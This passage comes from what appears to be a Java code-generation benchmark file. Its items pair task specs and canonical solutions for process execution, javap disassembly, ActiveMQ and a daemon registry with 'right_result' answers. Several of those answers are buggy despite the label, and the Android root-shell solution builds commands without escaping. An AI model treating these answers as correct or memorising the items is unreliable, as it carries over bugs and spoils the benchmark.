    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic static void diffFile(String mCustomDiffPath, String mCustomDiffPathArgs, File oldFile, File newFile, File diffFile) throws IOException {\n    String outPath = diffFile.getAbsolutePath();\n    String cmd = mCustomDiffPath;\n    List<String> cmds = new ArrayList<>();\n    for (String s : cmd.split(\" \")) {\n        if (!s.isEmpty()) {\n            cmds.add(s);\n        }\n    }\n    for (String s : mCustomDiffPathArgs.split(\" \")) {\n        if (!s.isEmpty()) {\n            cmds.add(s);\n        }\n    }\n    cmds.add(oldFile.getAbsolutePath());\n    cmds.add(newFile.getAbsolutePath());\n    cmds.add(outPath);\n\n    ProcessBuilder pb = new ProcessBuilder(cmds);\n    pb.redirectErrorStream(true);\n    Process process = pb.start();\n    BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));\n    String line;\n    while ((line = br.readLine()) != null) {\n        Logger.d(line);\n    }\n    int exitCode = process.waitFor();\n    process.destroy();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.*;\n\npublic class DiffExecutor {\n    public static void diffFile(String mCustomDiffPath, String mCustomDiffPathArgs, File oldFile, File newFile, File diffFile) throws IOException, InterruptedException {\n        ProcessBuilder pb = new ProcessBuilder(mCustomDiffPath, mCustomDiffPathArgs, oldFile.getAbsolutePath(), newFile.getAbsolutePath());\n        pb.redirectErrorStream(true);\n        Process p = pb.start();\n\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));\n             BufferedWriter writer = new BufferedWriter(new FileWriter(diffFile))) {\n\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line); // Log the output\n                writer.write(line);\n                writer.newLine();\n            }\n        }\n\n        int exitCode = p.waitFor();\n        if (exitCode != 0) {\n            throw new IOException(\"Diff process exited with non-zero code: \" + exitCode);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 297,
    "Instruction": "Task Description: Create a Java class that executes external processes, handles their output streams, and provides a way to interact with the process execution through callback methods.\n\nClass Description: The ProcessExecutor class is designed to manage external process execution in a cross-platform manner (handling Windows and Unix-like systems differently). It provides methods to start processes, redirect their output streams, and handle both standard output and error streams through a handler interface.\n\nAttributes:\n- process: Process - Represents the currently running external process\n- processBuilder: ProcessBuilder - Used to configure and start external processes\n\nMethods:\n- execRedirected: static Process(String[] command) throws IOException - Configures and starts an external process with error stream redirected to standard output. Handles Windows-specific command formatting.\n  - Input: String[] command - The command and arguments to execute\n  - Output: Process - The started process instance\n\n- listenOnProcess: int(String[] arguments, ProcessOutputHandler handler) - Executes a command and listens to its output streams, forwarding output lines and errors to the handler.\n  - Input: \n    - String[] arguments - The command and arguments to execute\n    - ProcessOutputHandler handler - Callback interface for handling output and errors\n  - Output: int - The exit value of the process (-1 if execution failed)\n\n- ProcessOutputHandler: interface - Callback interface for handling process output and errors\n  - Methods:\n    - handleOutputLine: void(String line) - Called for each line of output from the process\n    - handleError: void(String errorMessage) - Called when an error occurs during process execution",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.Map;\n\npublic class ProcessExecutor {\n\n    private Process process;\n    private ProcessBuilder processBuilder;\n\n    public static Process execRedirected(String[] command) throws IOException {\n        ProcessBuilder pb;\n\n        if (!OSUtils.isWindows()) {\n            pb = new ProcessBuilder(command);\n        } else {\n            String[] cmdLine = new String[command.length];\n            for (int i = 0; i < command.length; i++)\n                cmdLine[i] = command[i].replace(\"\\\"\", \"\\\\\\\"\");\n            pb = new ProcessBuilder(cmdLine);\n            Map<String, String> env = pb.environment();\n            env.put(\"CYGWIN\", \"nodosfilewarning\");\n        }\n        pb.redirectErrorStream(true);\n\n        return pb.start();\n    }\n\n    public int listenOnProcess(String[] arguments, ProcessOutputHandler handler) {\n        try {\n            final Process p = execRedirected(arguments);\n            Thread thread = new Thread() {\n                public void run() {\n                    try {\n                        InputStreamReader reader = new InputStreamReader(p.getInputStream());\n                        int c;\n                        String line = \"\";\n                        while ((c = reader.read()) != -1) {\n                            if ((char) c == '\\r')\n                                continue;\n                            if ((char) c == '\\n') {\n                                handler.handleOutputLine(line);\n                                line = \"\";\n                            } else {\n                                line += (char) c;\n                            }\n                        }\n                        handler.handleOutputLine(line);\n                        reader.close();\n\n                        reader = new InputStreamReader(p.getErrorStream());\n                        while ((c = reader.read()) != -1)\n                            System.err.print((char) c);\n                        reader.close();\n                    } catch (Exception e) {\n                        handler.handleError(\"Run Exception: \" + e.getMessage());\n                    }\n                }\n            };\n            thread.start();\n            int res = p.waitFor();\n            thread.join();\n            return res;\n        } catch (Exception e) {\n            handler.handleError(\"Process Exception: \" + e.getMessage());\n        }\n        return -1;\n    }\n\n    public interface ProcessOutputHandler {\n        void handleOutputLine(String line);\n        void handleError(String errorMessage);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class ProcessExecutor {\n    private Process process;\n    private ProcessBuilder processBuilder;\n\n    public static Process execRedirected(String[] command) throws IOException {\n        if (System.getProperty(\"os.name\").toLowerCase().contains(\"win\")) {\n            return new ProcessBuilder(command).start();\n        } else {\n            return Runtime.getRuntime().exec(command);\n        }\n    }\n\n    public int listenOnProcess(String[] arguments, ProcessOutputHandler handler) {\n        try {\n            this.process = execRedirected(arguments);\n            BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            BufferedReader stdError = new BufferedReader(new InputStreamReader(process.getErrorStream()));\n\n            String s;\n            while ((s = stdInput.readLine()) != null) {\n                handler.handleOutputLine(s);\n            }\n            while ((s = stdError.readLine()) != null) {\n                handler.handleError(s);\n            }\n\n            int exitCode = process.waitFor();\n            return exitCode;\n        } catch (IOException | InterruptedException e) {\n            handler.handleError(e.getMessage());\n            return -1;\n        }\n    }\n\n    public interface ProcessOutputHandler {\n        void handleOutputLine(String line);\n        void handleError(String errorMessage);\n    }\n}\n```"
  },
  {
    "Task_id": 298,
    "Instruction": "Task Description: Create a Java function that disassembles a Java class file using the `javap` command-line tool and returns the disassembled output as a string.\n\nFunction Description: The function `disassembleClassFromJava` takes a Java class file as input, executes the `javap -c` command on it to disassemble the bytecode, and returns the disassembled output as a string. It handles the process execution, stream management, and error handling.\n\nInput: \n- `resourceFile` (String): The path or name of the Java class file to be disassembled.\n\nOutput: \n- (String): The disassembled bytecode output from the `javap` command. If an error occurs, returns an error message string.",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.StringWriter;\nimport java.net.URL;\n\npublic String disassembleClassFromJava(String resourceFile) {\n    try {\n        ProcessBuilder pb = new ProcessBuilder(\"javap\", \"-c\", resourceFile)\n                .redirectErrorStream(true);\n\n        final Process process = pb.start();\n        final StringWriter writer = new StringWriter();\n        new Thread(() -> IOUtils.copyStreamNoException(process.getInputStream(), writer)).start();\n\n        final int ignored = process.waitFor();\n        final String processOutput = writer.toString();\n        return processOutput;\n    } catch (InterruptedException e) {\n        Thread.currentThread().interrupt();\n        return \"Unable to run javap command (\" + e.getMessage() + \").\";\n    } catch (IOException e) {\n        return \"Unable to run javap command (\" + e.getMessage() + \").\";\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class ClassDisassembler {\n    public static String disassembleClassFromJava(String resourceFile) {\n        StringBuilder disassembledCode = new StringBuilder();\n        ProcessBuilder processBuilder = new ProcessBuilder(\"javap\", \"-c\", resourceFile);\n        \n        try {\n            Process process = processBuilder.start();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            \n            while ((line = reader.readLine()) != null) {\n                disassembledCode.append(line).append(\"\\n\");\n            }\n            \n            int exitCode = process.waitFor();\n            if (exitCode != 0) {\n                return \"Error: Disassembly failed with exit code \" + exitCode;\n            }\n        } catch (IOException | InterruptedException e) {\n            return \"Error: \" + e.getMessage();\n        }\n        \n        return disassembledCode.toString();\n    }\n\n    // Example usage\n    public static void main(String[] args) {\n        String result = disassembleClassFromJava(\"Example.class\");\n        System.out.println(result);\n    }\n}\n```"
  },
  {
    "Task_id": 3,
    "Instruction": "Task Description: Create a Java class that implements an ActiveMQ producer for sending byte array messages to a specified queue.\n\nClass Description: The ActiveMQProducer class establishes a connection to an ActiveMQ broker, creates a message producer, and provides functionality to send byte array messages to a specified queue. It handles connection management and resource cleanup.\n\nAttributes:\n- connectionFactory: ActiveMQConnectionFactory - Factory for creating connections to the ActiveMQ broker\n- connection: javax.jms.Connection - The connection to the ActiveMQ broker\n- session: Session - JMS session for creating messages and producers\n- destination: Destination - The target queue for messages\n- producer: MessageProducer - The message producer for sending messages\n\nMethods:\n- ActiveMQProducer(String brokerUrl, String queueName) -> void - Constructor that initializes the connection to the ActiveMQ broker and sets up the message producer for the specified queue\n- sendBytesMessage(byte[] messageData) -> void - Creates and sends a bytes message containing the provided byte array to the configured queue\n- close() -> void - Closes the session and connection to release resources",
    "Canonical_solution": "import javax.jms.BytesMessage;\nimport javax.jms.Destination;\nimport javax.jms.JMSException;\nimport javax.jms.MessageProducer;\nimport javax.jms.Session;\nimport org.apache.activemq.ActiveMQConnectionFactory;\n\npublic class ActiveMQProducer {\n\n    private ActiveMQConnectionFactory connectionFactory;\n    private javax.jms.Connection connection;\n    private Session session;\n    private Destination destination;\n    private MessageProducer producer;\n\n    public ActiveMQProducer(String brokerUrl, String queueName) throws JMSException {\n        connectionFactory = new ActiveMQConnectionFactory(brokerUrl);\n        connection = connectionFactory.createConnection();\n        connection.start();\n        session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);\n        destination = session.createQueue(queueName);\n        producer = session.createProducer(destination);\n    }\n\n    public void sendBytesMessage(byte[] messageData) throws JMSException {\n        BytesMessage message = session.createBytesMessage();\n        message.writeBytes(messageData);\n        producer.send(message);\n    }\n\n    public void close() throws JMSException {\n        session.close();\n        connection.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 38,
    "right_result": "```java\nimport javax.jms.*;\nimport org.apache.activemq.ActiveMQConnectionFactory;\n\npublic class ActiveMQProducer {\n    private ConnectionFactory connectionFactory;\n    private Connection connection;\n    private Session session;\n    private Destination destination;\n    private MessageProducer producer;\n\n    public ActiveMQProducer(String brokerUrl, String queueName) throws JMSException {\n        this.connectionFactory = new ActiveMQConnectionFactory(brokerUrl);\n        this.connection = connectionFactory.createConnection();\n        this.connection.start();\n        this.session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);\n        this.destination = session.createQueue(queueName);\n        this.producer = session.createProducer(destination);\n    }\n\n    public void sendBytesMessage(byte[] messageData) throws JMSException {\n        BytesMessage message = session.createBytesMessage();\n        message.writeBytes(messageData);\n        producer.send(message);\n    }\n\n    public void close() throws JMSException {\n        if (producer != null) producer.close();\n        if (session != null) session.close();\n        if (connection != null) connection.close();\n    }\n}\n```"
  },
  {
    "Task_id": 30,
    "Instruction": "Task Description: Implement a thread-safe registry class for managing daemon processes using memory-mapped files for persistent storage. The class should handle concurrent access, automatic file resizing, and data recovery from corrupted states.\n\nClass Description: DaemonRegistry is a thread-safe class that maintains a registry of daemon processes in a memory-mapped file. It provides methods to read, update, and manage daemon information with proper file locking and automatic buffer resizing when needed. The class implements AutoCloseable for proper resource management.\n\nAttributes:\n- LOGGER: Logger - Logger instance for logging operations\n- MAX_LENGTH: int - Maximum initial size for the memory-mapped buffer (32KB)\n- LOCK_TIMEOUT_MS: long - Timeout duration for acquiring file locks (20 seconds)\n- locks: Map<Path, Object> - Static concurrent map for maintaining file-level locks\n- registryFile: Path - Path to the registry file\n- lck: Object - Instance-specific lock object\n- channel: FileChannel - File channel for the registry file\n- buffer: MappedByteBuffer - Memory-mapped byte buffer for the file\n- size: long - Current size of the memory-mapped buffer\n- infosMap: Map<String, DaemonInfo> - Map storing daemon information\n\nMethods:\n- DaemonRegistry(Path registryFile) -> void - Constructor that initializes the registry by creating or opening the specified file and setting up the memory-mapped buffer\n- close() -> void - Closes the file channel and releases system resources\n- getAll() -> List<DaemonInfo> - Returns a list of all registered daemon information\n- read() -> void - Reads all daemon information from the memory-mapped file into the internal map\n- doUpdate(Runnable updater) -> void - Performs a read or update operation with file locking, handles buffer resizing and data recovery\n- tryLock() -> FileLock - Attempts to acquire an exclusive lock on the file\n- reset() -> void - Clears the internal map and resets the buffer\n- readString() -> String - Reads a UTF-8 encoded string from the buffer\n- writeString(String str) -> void - Writes a UTF-8 encoded string to the buffer\n- nextPowerOf2(long a, long min) -> long - Helper method to calculate the next power of 2 greater than or equal to input values",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.BufferOverflowException;\nimport java.nio.BufferUnderflowException;\nimport java.nio.ByteBuffer;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.FileLock;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\n\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class DaemonRegistry implements AutoCloseable {\n\n    private static final Logger LOGGER = LoggerFactory.getLogger(DaemonRegistry.class);\n    private static final int MAX_LENGTH = 32768;\n    private static final long LOCK_TIMEOUT_MS = 1000 * 20;\n    private static final Map<Path, Object> locks = new ConcurrentHashMap<>();\n\n    private final Path registryFile;\n    private final Object lck;\n    private final FileChannel channel;\n    private MappedByteBuffer buffer;\n    private long size;\n    private final Map<String, DaemonInfo> infosMap = new HashMap<>();\n\n    public DaemonRegistry(Path registryFile) {\n        final Path absPath = registryFile.toAbsolutePath().normalize();\n        this.lck = locks.computeIfAbsent(absPath, p -> new Object());\n        this.registryFile = absPath;\n        try {\n            if (!Files.isRegularFile(absPath)) {\n                if (!Files.isDirectory(absPath.getParent())) {\n                    Files.createDirectories(absPath.getParent());\n                }\n            }\n            channel = FileChannel.open(\n                    absPath, StandardOpenOption.CREATE, StandardOpenOption.READ, StandardOpenOption.WRITE);\n            size = nextPowerOf2(channel.size(), MAX_LENGTH);\n            buffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, size);\n        } catch (IOException e) {\n            throw new DaemonException(e);\n        }\n    }\n\n    public void close() {\n        try {\n            channel.close();\n        } catch (IOException e) {\n            throw new DaemonException(\"Error closing registry\", e);\n        }\n    }\n\n    public List<DaemonInfo> getAll() {\n        read();\n        return new ArrayList<>(infosMap.values());\n    }\n\n    private void read() {\n        doUpdate(null);\n    }\n\n    private void doUpdate(Runnable updater) {\n        if (!Files.isReadable(registryFile)) {\n            throw new DaemonException(\"Registry became unaccessible\");\n        }\n\n        synchronized (lck) {\n            final long deadline = System.currentTimeMillis() + LOCK_TIMEOUT_MS;\n            while (System.currentTimeMillis() < deadline) {\n                try (FileLock l = tryLock()) {\n                    BufferCaster.cast(buffer).position(0);\n                    infosMap.clear();\n                    int nb = buffer.getInt();\n                    for (int i = 0; i < nb; i++) {\n                        String daemonId = readString();\n                        String javaHome = readString();\n                        String mavenHome = readString();\n                        int pid = buffer.getInt();\n                        String address = readString();\n\n                        byte[] token = new byte[DaemonInfo.TOKEN_SIZE];\n                        buffer.get(token);\n\n                        String locale = readString();\n                        List<String> opts = new ArrayList<>();\n                        int nbOpts = buffer.getInt();\n                        for (int j = 0; j < nbOpts; j++) {\n                            opts.add(readString());\n                        }\n                        DaemonState state = DaemonState.values()[buffer.get()];\n                        long lastIdle = buffer.getLong();\n                        long lastBusy = buffer.getLong();\n                        DaemonInfo di = new DaemonInfo(\n                                daemonId, javaHome, mavenHome, pid, address, token, locale, opts, state, lastIdle,\n                                lastBusy);\n                        infosMap.putIfAbsent(di.getId(), di);\n                    }\n\n                    if (updater != null) {\n                        updater.run();\n                        BufferCaster.cast(buffer).position((int) 0);\n                        buffer.putInt(infosMap.size());\n                        for (DaemonInfo di : infosMap.values()) {\n                            writeString(di.getId());\n                            writeString(di.getJavaHome());\n                            writeString(di.getMvndHome());\n                            buffer.putInt(di.getPid());\n                            writeString(di.getAddress());\n                            buffer.put(di.getToken());\n                            writeString(di.getLocale());\n                            buffer.putInt(di.getOptions().size());\n                            for (String opt : di.getOptions()) {\n                                writeString(opt);\n                            }\n                            buffer.put((byte) di.getState().ordinal());\n                            buffer.putLong(di.getLastIdle());\n                            buffer.putLong(di.getLastBusy());\n                        }\n                    }\n                    return;\n                } catch (BufferOverflowException e) {\n                    size <<= 1;\n                    LOGGER.info(\"Resizing registry to {} kb due to buffer overflow\", (size / 1024));\n                    try {\n                        buffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, size);\n                    } catch (IOException ex) {\n                        ex.addSuppressed(e);\n                        throw new DaemonException(\"Could not resize registry \" + registryFile, ex);\n                    }\n                } catch (IOException e) {\n                    throw new DaemonException(\n                            \"Exception while \" + (updater != null ? \"updating \" : \"reading \") + registryFile, e);\n                } catch (IllegalStateException | ArrayIndexOutOfBoundsException | BufferUnderflowException e) {\n                    String absPath = registryFile.toAbsolutePath().normalize().toString();\n                    LOGGER.warn(\n                            \"Invalid daemon registry info, trying to recover from this issue. \"\n                                    + \"If you keep getting this warning, try deleting the `registry.bin` file at [{}]\",\n                            absPath,\n                            e);\n                    this.reset();\n                    return;\n                }\n            }\n            throw new RuntimeException(\"Could not lock \" + registryFile + \" within \" + LOCK_TIMEOUT_MS + \" ms\");\n        }\n    }\n\n    private FileLock tryLock() {\n        try {\n            return channel.tryLock(0, size, false);\n        } catch (IOException e) {\n            throw new DaemonException(\"Could not lock \" + registryFile, e);\n        }\n    }\n\n    private void reset() {\n        infosMap.clear();\n        BufferCaster.cast(buffer).clear();\n        buffer.putInt(0);\n    }\n\n    protected String readString() {\n        int sz = buffer.getShort();\n        if (sz == -1) {\n            return null;\n        }\n        if (sz < -1 || sz > 1024) {\n            throw new IllegalStateException(\"Bad string size: \" + sz);\n        }\n        byte[] buf = new byte[sz];\n        buffer.get(buf);\n        return new String(buf, StandardCharsets.UTF_8);\n    }\n\n    protected void writeString(String str) {\n        if (str == null) {\n            buffer.putShort((short) -1);\n            return;\n        }\n        byte[] buf = str.getBytes(StandardCharsets.UTF_8);\n        if (buf.length > 1024) {\n            LOGGER.warn(\"Attempting to write string longer than 1024 bytes: '{}'. Please raise an issue.\", str);\n            str = str.substring(0, 1033);\n            while (buf.length > 1024) {\n                str = str.substring(0, str.length() - 12) + \"\u2026\";\n                buf = str.getBytes(StandardCharsets.UTF_8);\n            }\n        }\n        buffer.putShort((short) buf.length);\n        buffer.put(buf);\n    }\n\n    private long nextPowerOf2(long a, long min) {\n        long b = min;\n        while (b < a) {\n            b = b << 1;\n        }\n        return b;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "right_result": "```java\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.*;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class DaemonRegistry implements AutoCloseable {\n    private static final Logger LOGGER = LoggerFactory.getLogger(DaemonRegistry.class);\n    private static final int MAX_LENGTH = 1 << 15; // 32KB\n    private static final long LOCK_TIMEOUT_MS = 20 * 1000L;\n    private static final Map<Path, Object> locks = new ConcurrentHashMap<>();\n    private final Path registryFile;\n    private final Object lck = new Object();\n    private FileChannel channel;\n    private MappedByteBuffer buffer;\n    private long size;\n    private final Map<String, DaemonInfo> infosMap = new HashMap<>();\n\n    public DaemonRegistry(Path registryFile) throws IOException {\n        this.registryFile = registryFile;\n        synchronized (locks.computeIfAbsent(registryFile, k -> new Object())) {\n            if (!registryFile.toFile().exists()) {\n                Files.createFile(registryFile);\n            }\n            channel = FileChannel.open(registryFile, StandardOpenOption.READ, StandardOpenOption.WRITE);\n            size = channel.size();\n            if (size == 0) {\n                resize(MAX_LENGTH);\n            } else {\n                read();\n            }\n        }\n    }\n\n    @Override\n    public void close() throws IOException {\n        synchronized (lck) {\n            if (channel != null) {\n                channel.close();\n            }\n        }\n    }\n\n    public List<DaemonInfo> getAll() {\n        return new ArrayList<>(infosMap.values());\n    }\n\n    private void read() {\n        synchronized (lck) {\n            buffer.rewind();\n            while (buffer.hasRemaining()) {\n                String key = readString();\n                if (key.isEmpty()) break;\n                DaemonInfo info = new DaemonInfo(readString(), readString());\n                infosMap.put(key, info);\n            }\n        }\n    }\n\n    private void doUpdate(Runnable updater) {\n        try (FileLock lock = tryLock()) {\n            if (lock != null) {\n                updater.run();\n                resize(buffer.position());\n            } else {\n                LOGGER.warn(\"Failed to acquire lock within timeout.\");\n            }\n        } catch (IOException e) {\n            LOGGER.error(\"Error during update.\", e);\n        }\n    }\n\n    private FileLock tryLock() throws IOException {\n        try {\n            return channel.tryLock(0, Long.MAX_VALUE, true);\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            throw new IOException(\"Interrupted while trying to lock file.\", e);\n        }\n    }\n\n    private void reset() {\n        synchronized (lck) {\n            infosMap.clear();\n            resize(MAX_LENGTH);\n        }\n    }\n\n    private String readString() {\n        int length = buffer.getInt();\n        ByteBuffer slice = buffer.slice();\n        slice.limit(length);\n        String str = StandardCharsets.UTF_8.decode(slice).toString();\n        buffer.position(buffer.position() + length);\n        return str;\n    }\n\n    private void writeString(String str) {\n        byte[] bytes = str.getBytes(StandardCharsets.UTF_8);\n        buffer.putInt(bytes.length);\n        buffer.put(bytes);\n    }\n\n    private long nextPowerOf2(long a, long min) {\n        a--;\n        a |= a >> 1;\n        a |= a >> 2;\n        a |= a >> 4;\n        a |= a >> 8;\n        a |= a >> 16;\n        a++;\n        return Math.max(a, min);\n    }\n\n    private void resize(long newSize) {\n        try {\n            synchronized (lck) {\n                if (newSize > size) {\n                    channel.truncate(newSize);\n                    buffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, newSize);\n                    size = newSize;\n                }\n            }\n        } catch (IOException e) {\n            LOGGER.error(\"Error resizing file.\", e);\n        }\n    }\n\n    public static class DaemonInfo {\n        private final String name;\n        private final String status;\n\n        public DaemonInfo(String name, String status) {\n            this.name = name;\n            this.status = status;\n        }\n\n        // Getters and setters\n    }\n}\n```"
  },
  {
    "Task_id": 300,
    "Instruction": "Task Description: Implement a function that executes an external process, captures its output and error streams, and handles the results appropriately, including error cases and output printing.\n\nFunction Description: The function `doFork` executes an external process specified by a command string, redirects its standard output and error streams to files, and optionally prints them. It waits for the process to complete, checks the exit code, and handles any exceptions or errors that occur during execution. The function also interacts with a `BinaryLinkServer` to retrieve results or exceptions from the forked process.\n\nInput:\n- `reader`: BinaryLinkServer - An object that reads results from the forked process and may contain exceptions.\n- `commandString`: List<String> - The command and arguments to execute the external process.\n- `stdOut`: File - The file to which the standard output of the process will be redirected.\n- `stdErr`: File - The file to which the standard error of the process will be redirected.\n- `printOut`: boolean - If true, the standard output will be printed to the console.\n- `printErr`: boolean - If true, the standard error will be printed to the console.\n\nOutput:\n- Returns `List<IterationResult>` - A list of results from the forked process if execution is successful.\n- Throws `BenchmarkException` - If the process fails (non-zero exit code), an IOException occurs, or the thread is interrupted.",
    "Canonical_solution": "import java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.List;\n\nprivate List<IterationResult> doFork(BinaryLinkServer reader, List<String> commandString,\n                                    File stdOut, File stdErr, boolean printOut, boolean printErr) {\n    try (FileOutputStream fosErr = new FileOutputStream(stdErr);\n         FileOutputStream fosOut = new FileOutputStream(stdOut)) {\n        ProcessBuilder pb = new ProcessBuilder(commandString);\n        Process p = pb.start();\n\n        InputStreamDrainer errDrainer = new InputStreamDrainer(p.getErrorStream(), fosErr);\n        InputStreamDrainer outDrainer = new InputStreamDrainer(p.getInputStream(), fosOut);\n\n        if (printErr) {\n            errDrainer.addOutputStream(new OutputFormatAdapter(out));\n        }\n\n        if (printOut) {\n            outDrainer.addOutputStream(new OutputFormatAdapter(out));\n        }\n\n        errDrainer.start();\n        outDrainer.start();\n\n        int ecode = p.waitFor();\n\n        errDrainer.join();\n        outDrainer.join();\n\n        reader.waitFinish();\n\n        if (ecode != 0) {\n            out.println(\"<forked VM failed with exit code \" + ecode + \">\");\n            out.println(\"<stdout last='\" + TAIL_LINES_ON_ERROR + \" lines'>\");\n            for (String l : FileUtils.tail(stdOut, TAIL_LINES_ON_ERROR)) {\n                out.println(l);\n            }\n            out.println(\"</stdout>\");\n            out.println(\"<stderr last='\" + TAIL_LINES_ON_ERROR + \" lines'>\");\n            for (String l : FileUtils.tail(stdErr, TAIL_LINES_ON_ERROR)) {\n                out.println(l);\n            }\n            out.println(\"</stderr>\");\n\n            out.println(\"\");\n        }\n\n        BenchmarkException exception = reader.getException();\n        if (exception == null) {\n            if (ecode == 0) {\n                return reader.getResults();\n            } else {\n                throw new BenchmarkException(new IllegalStateException(\"Forked VM failed with exit code \" + ecode));\n            }\n        } else {\n            throw exception;\n        }\n\n    } catch (IOException ex) {\n        out.println(\"<failed to invoke the VM, caught IOException: \" + ex.getMessage() + \">\");\n        out.println(\"\");\n        throw new BenchmarkException(ex);\n    } catch (InterruptedException ex) {\n        out.println(\"<host VM has been interrupted waiting for forked VM: \" + ex.getMessage() + \">\");\n        out.println(\"\");\n        throw new BenchmarkException(ex);\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.File;\nimport java.io.IOException;\nimport java.util.List;\n\npublic class ForkExecutor {\n    public static List<IterationResult> doFork(BinaryLinkServer reader, List<String> commandString, File stdOut, File stdErr, boolean printOut, boolean printErr) throws BenchmarkException {\n        ProcessBuilder pb = new ProcessBuilder(commandString);\n        pb.redirectError(stdErr);\n        pb.redirectOutput(stdOut);\n\n        try {\n            Process process = pb.start();\n            Thread outThread = startStreamHandler(process.getInputStream(), System.out::println, printOut);\n            Thread errThread = startStreamHandler(process.getErrorStream(), System.err::println, printErr);\n\n            int exitCode = process.waitFor();\n            outThread.join();\n            errThread.join();\n\n            if (exitCode != 0) {\n                throw new BenchmarkException(\"Process exited with non-zero code: \" + exitCode);\n            }\n\n            return reader.readResults();\n        } catch (IOException | InterruptedException e) {\n            throw new BenchmarkException(\"Error occurred while executing process\", e);\n        }\n    }\n\n    private static Thread startStreamHandler(java.io.InputStream stream, java.util.function.Consumer<String> consumer, boolean print) {\n        Thread thread = new Thread(() -> {\n            try (java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(stream))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    if (print) {\n                        consumer.accept(line);\n                    }\n                }\n            } catch (IOException e) {\n                // Handle exception as needed\n            }\n        });\n        thread.start();\n        return thread;\n    }\n}\n```"
  },
  {
    "Task_id": 302,
    "Instruction": "Task Description: Create a Java class that handles process execution, logging, and management, with support for both regular and root-level execution on Android systems.\n\nClass Description: ProcessHandler is a utility class designed to manage external process execution in Android applications. It provides functionality to launch processes (with optional root privileges), capture and log their output, and retrieve process information. The class handles environment variables, stream management, and maintains a wake lock during process execution to prevent CPU sleep.\n\nAttributes:\n- mContext: [Context] - Android application context used for system services\n- mUseRoot: [boolean] - Flag indicating whether root privileges should be used\n- mPreferences: [SharedPreferences] - Shared preferences for configuration\n\nMethods:\n- setupAndLaunch([HashMap<String, String> env, String[] command]) -> [Process] - Configures and starts a process with the given environment variables and command, supporting both regular and root execution\n- log([InputStream is, int priority]) -> [Thread] - Starts a thread to continuously read and log input from the given stream at the specified log priority\n- runProcess([ProcessBuilder pb, boolean returnStdOut]) -> [String] - Executes a process, optionally capturing its standard output, while maintaining a wake lock and logging output\n- getProcessPIDs([String processName]) -> [List<String>] - Returns a list of process IDs matching the given process name, supporting both regular and root-level process listing",
    "Canonical_solution": "import android.annotation.SuppressLint;\nimport android.content.Context;\nimport android.os.PowerManager;\nimport android.util.Log;\n\nimport com.google.common.base.Charsets;\nimport com.nutomic.syncthingandroid.service.Constants;\nimport com.nutomic.syncthingandroid.util.Util;\n\nimport java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\nimport javax.inject.Inject;\n\nimport eu.chainfire.libsuperuser.Shell;\n\npublic class ProcessHandler {\n\n    private static final String TAG = \"ProcessHandler\";\n    private final Context mContext;\n    private final boolean mUseRoot;\n    @Inject SharedPreferences mPreferences;\n\n    public ProcessHandler(Context context) {\n        mContext = context;\n        mUseRoot = mPreferences.getBoolean(Constants.PREF_USE_ROOT, false) && Shell.SU.available();\n    }\n\n    public Process setupAndLaunch(HashMap<String, String> env, String[] command) throws IOException {\n        if (mUseRoot) {\n            ProcessBuilder pb = new ProcessBuilder(\"su\");\n            Process process = pb.start();\n            DataOutputStream suOut = new DataOutputStream(process.getOutputStream());\n            for (Map.Entry<String, String> entry : env.entrySet()) {\n                suOut.writeBytes(String.format(\"export %s=\\\"%s\\\"\\n\", entry.getKey(), entry.getValue()));\n            }\n            suOut.flush();\n            suOut.writeBytes(\"exec \" + TextUtils.join(\" \", command) + \"\\n\");\n            suOut.flush();\n            return process;\n        } else {\n            ProcessBuilder pb = new ProcessBuilder(command);\n            pb.environment().putAll(env);\n            return pb.start();\n        }\n    }\n\n    public Thread log(final InputStream is, final int priority) {\n        Thread t = new 